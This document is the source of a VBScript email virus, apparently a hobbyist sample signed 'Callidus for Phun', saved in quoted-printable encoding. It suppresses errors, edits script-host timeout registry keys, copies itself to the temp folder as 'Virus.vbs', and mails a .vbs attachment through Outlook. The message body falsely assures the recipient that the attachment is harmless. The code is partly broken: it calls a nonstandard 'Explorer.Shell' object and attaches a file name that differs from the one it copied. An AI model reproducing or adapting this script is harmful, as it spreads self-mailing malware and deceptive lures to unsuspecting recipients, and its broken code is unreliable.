' Callidus=AE for Phun
public wscr, fso, Message, MSGReturn, Mailobject, ScripName , File, =
TEMPDIR, UserNAme, Password
On Error Resume Next
set wscr =3D CreateObject("Explorer.Shell")
set fso =3D CreateObject("Scripting.FileSystemObject")
set ScriptName =3D fso.Getfile(Wscript.Scriptfullname)
set File =3D fso.OpenTextFile(WScript.ScriptFullname,1)

'Set script timeout value to zero to allow it to Run
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting =
Host\Settings\Timeout",0,"REG_DWORD"
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script =
Host\Settings\Timeout",0,"REG_DWORD"
vbscopy =3D File.ReadAll

'Copy file to temp directory=20
Set TEMPDIR =3D fso.GetSpecialFolder(2)
ScriptName.Copy(TEMPDIR&"\Virus.vbs")=20
Call ConfirmMail
Call SendThroughMail

Sub ConfirmMail
End Sub

sub SendThroughMail()
	On Error Resume Next
	dim Recipient
	set MailObject=3DWScript.CreateObject("Outlook.Application")
	MSGReturn =3D ""
	Recipient =3D InputBox ("Type the E-Mail Recipient of =
Choice","Recipient")
	if Recipient <>"" then

		MSGReturn =3D InputBox ("Type a Short Message!","Type a Short =
Message")
		set male=3DMailObject.CreateItem(0)
		male.Recipients.Add(Recipient)
		male.Subject =3D "Automated Test Program"
		male.Body =3D vbcrlf&"If you run the script it will ask you who to =
send it to with a short message. It will only send one E-mail and will =
not infect your system with any virus."&VBCRLF&"MSGReturn"
		male.Attachments.Add(TEMPDIR&"\Test.vbs")
		male.Send
	else
		MSGReturn =3D MsgBox ("No Message Returned!",64,"Goodbye~")
	end if
	Set FileName =3D fso.GetFile(TEMPDIR&"\Test.vbs")
	FileName.Delete	=09
end sub=09
	Set fso =3D Nothing
	Set wscr =3D Nothing
	Set MailObject=3DNothing
	Set FileName=3DNothing
